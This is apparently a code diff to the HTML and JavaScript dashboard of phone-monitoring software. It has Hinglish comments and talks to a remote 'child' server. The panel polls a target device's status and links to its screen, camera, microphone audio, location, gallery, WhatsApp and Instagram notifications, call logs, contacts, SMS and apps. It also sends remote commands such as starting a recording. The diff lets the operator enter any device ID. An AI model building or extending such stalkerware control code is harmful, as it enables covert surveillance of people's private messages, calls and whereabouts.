@@ -6,6 +6,7 @@
     <title>Admin Control Panel</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
+        /* CSS MEIN KOI CHANGE NAHI KIYA - AAPKA PURANA STYLE HI HAI */
         :root {
             --bg-color: #0f0f0f;
             --glass-bg: rgba(255, 255, 255, 0.1);
@@ -15,27 +16,22 @@
             --accent: #4caf50;
             --offline: #ff4444;
         }
-
         body {
             background-color: var(--bg-color);
             background-image: linear-gradient(45deg, #000000, #1a1a1a);
             color: var(--text-main);
             font-family: 'Segoe UI', sans-serif;
             margin: 0; padding: 20px;
-            display: flex; justify-content: center;
+            display: flex; flex-direction: column; align-items: center;
         }
-
         .container {
             width: 100%; max-width: 450px;
             background: rgba(0, 0, 0, 0.5);
             border-radius: 30px; padding: 20px;
             border: 1px solid var(--glass-border);
         }
-
-        /* Status Header */
         .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
-        .device-name { font-size: 1.1rem; font-weight: bold; text-transform: uppercase; }
-        
+        .device-name { font-size: 1.1rem; font-weight: bold; text-transform: uppercase; color: #00f3ff; }
         .status-badge {
             background: #222; padding: 5px 12px; border-radius: 20px;
             font-size: 0.75rem; display: flex; align-items: center; gap: 8px;
@@ -43,8 +39,6 @@
         .dot { height: 10px; width: 10px; border-radius: 50%; background: #555; transition: 0.3s; }
         .dot.online { background: var(--accent); box-shadow: 0 0 10px var(--accent); }
         .dot.offline { background: var(--offline); box-shadow: 0 0 10px var(--offline); }
-
-        /* Info Panel */
         .info-panel { display: flex; gap: 12px; margin-bottom: 20px; }
         .info-card {
             flex: 1; background: var(--glass-bg); padding: 12px;
@@ -52,14 +46,10 @@
         }
         .label { font-size: 0.65rem; color: var(--text-muted); letter-spacing: 1px; margin-bottom: 5px; }
         .value { font-size: 0.9rem; font-weight: 500; }
-
-        /* Battery Section */
         .battery-details { background: rgba(255,255,255,0.03); border-radius: 15px; padding: 15px; margin-bottom: 20px; }
         .battery-header { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 0.85rem; }
         .battery-bar-bg { width: 100%; height: 6px; background: #333; border-radius: 10px; overflow: hidden; }
         .battery-bar-fill { width: 0%; height: 100%; background: var(--accent); transition: 1s ease-in-out; }
-
-        /* Grid Controls */
         .controls-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; }
         .control-btn {
             background: var(--glass-bg); border-radius: 18px; aspect-ratio: 1/1;
@@ -70,17 +60,20 @@
         .control-btn:hover { background: rgba(255, 255, 255, 0.15); transform: translateY(-2px); border-color: var(--accent); }
         .control-btn i { font-size: 1.2rem; margin-bottom: 6px; }
         .control-btn span { font-size: 0.6rem; text-align: center; color: #bbb; }
-
-        .fa-whatsapp { color: #25D366; } .fa-instagram { color: #E1306C; } .fa-location-dot { color: #ff4444; }
+        .id-display { margin-bottom: 15px; font-size: 0.8rem; color: #00f3ff; cursor: pointer; border: 1px dashed #00f3ff; padding: 5px 15px; border-radius: 10px; }
     </style>
 </head>
 <body>
+
+    <div class="id-display" onclick="askID()">
+        <i class="fa-solid fa-id-card"></i> Monitoring ID: <span id="currentID">None</span>
+    </div>
 
     <div class="container">
         <div class="header">
             <div>
                 <i class="fa-solid fa-mobile-side"></i>
-                <span class="device-name" id="deviceName">M2103K19I</span>
+                <span class="device-name" id="deviceName">Searching...</span>
             </div>
             <div class="status-badge">
                 <span id="statusDot" class="dot"></span>
@@ -95,7 +88,7 @@
             </div>
             <div class="info-card">
                 <div class="label">NETWORK</div>
-                <div id="networkType" class="value">Searching...</div>
+                <div id="networkType" class="value">--</div>
             </div>
         </div>
 
@@ -107,99 +100,108 @@
             <div class="battery-bar-bg">
                 <div id="batteryFill" class="battery-bar-fill"></div>
             </div>
-            <div id="batteryStatus" style="font-size: 0.7rem; color: var(--text-muted); margin-top: 8px;">Waiting for data...</div>
+            <div id="batteryStatus" style="font-size: 0.7rem; color: var(--text-muted); margin-top: 8px;">Waiting...</div>
         </div>
 
         <div class="controls-grid">
-            <a href="view_screen.html" class="control-btn"><i class="fa-solid fa-mobile-screen"></i><span>Screen</span></a>
-            <a href="view_camera.html" class="control-btn"><i class="fa-solid fa-camera"></i><span>Camera</span></a>
-            <a href="view_audio.html" class="control-btn"><i class="fa-solid fa-microphone"></i><span>Audio</span></a>
-            <a href="view_location.html" class="control-btn"><i class="fa-solid fa-location-dot"></i><span>Location</span></a>
-            <a href="view_gallery.html" class="control-btn"><i class="fa-solid fa-images"></i><span>Gallery</span></a>
-            <a href="view_notifications.html" class="control-btn"><i class="fa-regular fa-message"></i><span>Notify</span></a>
+            <a href="#" onclick="openView('screen')" class="control-btn"><i class="fa-solid fa-mobile-screen"></i><span>Screen</span></a>
+            <a href="#" onclick="openView('camera')" class="control-btn"><i class="fa-solid fa-camera"></i><span>Camera</span></a>
+            <a href="#" onclick="openView('audio')" class="control-btn"><i class="fa-solid fa-microphone"></i><span>Audio</span></a>
+            <a href="#" onclick="openView('location')" class="control-btn"><i class="fa-solid fa-location-dot"></i><span>Location</span></a>
+            <a href="#" onclick="openView('gallery')" class="control-btn"><i class="fa-solid fa-images"></i><span>Gallery</span></a>
+            <a href="#" onclick="openView('notifications')" class="control-btn"><i class="fa-regular fa-message"></i><span>Notify</span></a>
             
             <div class="control-btn" id="soundBtn" onclick="cycleSoundMode()">
                 <i class="fa-solid fa-bell" id="soundIcon"></i><span id="soundText">Sound</span>
             </div>
 
             <div class="control-btn" onclick="sendCommand('rec_start')"><i class="fa-solid fa-circle-dot"></i><span>Rec</span></div>
-            <a href="view_notifications.html" class="control-btn"><i class="fa-brands fa-whatsapp"></i><span>WhatsApp</span></a>
-            <a href="view_notifications.html" class="control-btn"><i class="fa-brands fa-instagram"></i><span>Instagram</span></a>
-            <a href="view_call_logs.html" class="control-btn"><i class="fa-solid fa-phone"></i><span>Calls</span></a>
-            <a href="view_contacts.html" class="control-btn"><i class="fa-solid fa-address-book"></i><span>Contacts</span></a>
-            <a href="view_sms.html" class="control-btn"><i class="fa-solid fa-comments"></i><span>SMS</span></a>
-            <a href="view_apps.html" class="control-btn"><i class="fa-brands fa-google-play"></i><span>Apps</span></a>
+            <a href="#" onclick="openView('notifications')" class="control-btn"><i class="fa-brands fa-whatsapp"></i><span>WhatsApp</span></a>
+            <a href="#" onclick="openView('notifications')" class="control-btn"><i class="fa-brands fa-instagram"></i><span>Instagram</span></a>
+            <a href="#" onclick="openView('call_logs')" class="control-btn"><i class="fa-solid fa-phone"></i><span>Calls</span></a>
+            <a href="#" onclick="openView('contacts')" class="control-btn"><i class="fa-solid fa-address-book"></i><span>Contacts</span></a>
+            <a href="#" onclick="openView('sms')" class="control-btn"><i class="fa-solid fa-comments"></i><span>SMS</span></a>
+            <a href="#" onclick="openView('apps')" class="control-btn"><i class="fa-brands fa-google-play"></i><span>Apps</span></a>
         </div>
     </div>
 
     <script>
-        // --- REAL-TIME DATA FETCHING ---
+        const API_BASE = 'https://child-v9no.onrender.com';
+        let DEVICE_ID = '';
+
+        // 1. App khulte hi ID puchne ka function
+        function askID() {
+            let id = prompt("Bhai, App mein dikhne waali 6-Digit ID dalo:", DEVICE_ID);
+            if (id) {
+                DEVICE_ID = id;
+                document.getElementById('currentID').innerText = DEVICE_ID;
+                updateDashboard();
+            }
+        }
+
+        // Dashboard update logic
         function updateDashboard() {
-            // YAHAN GALTI THI: 'Child_Phone_01' ki jagah 'M2103K19I' aur pura URL dala hai
-            fetch('https://child-v9no.onrender.com/api/device-status/M2103K19I')
+            if (!DEVICE_ID) return;
+
+            fetch(`${API_BASE}/api/device-status/${DEVICE_ID}`)
                 .then(res => res.json())
                 .then(data => {
-                    // Update Device Name & Version
-                    document.getElementById('deviceName').innerText = data.model || "M2103K19I";
-                    document.getElementById('androidVer').innerText = "V" + (data.android_version || "--");
+                    document.getElementById('deviceName').innerText = data.model || DEVICE_ID;
+                    document.getElementById('androidVer').innerText = "V" + (data.version || "--");
                     
-                    // Update Connection Status
                     const dot = document.getElementById('statusDot');
                     const statusText = document.getElementById('statusText');
                     
                     if(data.isOnline) {
                         dot.className = "dot online";
                         statusText.innerText = "Connected";
-                        document.getElementById('networkType').innerText = "Online";
-                        // Color bhi green kar diya
                         statusText.style.color = "#4caf50";
+                        document.getElementById('networkType').innerText = "Online";
                     } else {
                         dot.className = "dot offline";
                         statusText.innerText = "Disconnected";
-                        document.getElementById('networkType').innerText = "Offline";
                         statusText.style.color = "#ff4444";
+                        document.getElementById('networkType').innerText = "Offline";
                     }
 
-                    // Update Battery
                     const battery = data.battery || 0;
                     document.getElementById('batteryPercent').innerText = battery + "%";
                     document.getElementById('batteryFill').style.width = battery + "%";
-                    document.getElementById('batteryStatus').innerText = data.isCharging ? "Charging..." : "Discharging";
-                    
-                    // Battery Color change
-                    document.getElementById('batteryFill').style.background = battery < 20 ? "#ff4444" : "#4caf50";
+                    document.getElementById('batteryStatus').innerText = data.charging ? "Charging..." : "Discharging";
                 })
-                .catch(err => {
-                    console.log("Waiting for server...");
-                    document.getElementById('statusText').innerText = "Connecting...";
-                });
+                .catch(err => console.log("Searching..."));
         }
 
-        // Poll server every 3 seconds for updates
-        setInterval(updateDashboard, 3000);
+        // Pages kholne ka dynamic tareeka
+        function openView(page) {
+            if(!DEVICE_ID) return askID();
+            window.location.href = `view_${page}.html?id=${DEVICE_ID}`;
+        }
 
-        // Sound Mode Switcher
+        // Command bhejne ka dynamic tareeka
+        function sendCommand(action) {
+            if(!DEVICE_ID) return askID();
+            fetch(`${API_BASE}/api/send-command`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ device_id: DEVICE_ID, command: action })
+            });
+        }
+
+        // Sound Switcher logic
         let currentMode = 0;
         function cycleSoundMode() {
             const icon = document.getElementById('soundIcon');
             const text = document.getElementById('soundText');
             currentMode = (currentMode + 1) % 3;
-            if(currentMode === 0) { icon.className = "fa-solid fa-bell"; text.innerText = "Normal"; sendCommand('ring'); }
+            if(currentMode === 0) { icon.className = "fa-solid fa-bell"; text.innerText = "Normal"; sendCommand('normal'); }
             else if(currentMode === 1) { icon.className = "fa-solid fa-vibration"; text.innerText = "Vibrate"; sendCommand('vibrate'); }
             else { icon.className = "fa-solid fa-bell-slash"; text.innerText = "Silent"; sendCommand('silent'); }
         }
 
-        function sendCommand(action) {
-            // YAHAN BHI ID CHANGE KAR DI HAI AUR PURA URL DIYA HAI
-            fetch('https://child-v9no.onrender.com/api/send-command', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ device_id: 'M2103K19I', command: action })
-            });
-        }
-        
-        // Load hote hi check karega
-        updateDashboard();
+        // Start
+        setInterval(updateDashboard, 4000);
+        askID(); // Pehli baar ID pucho
     </script>
 </body>
 </html>
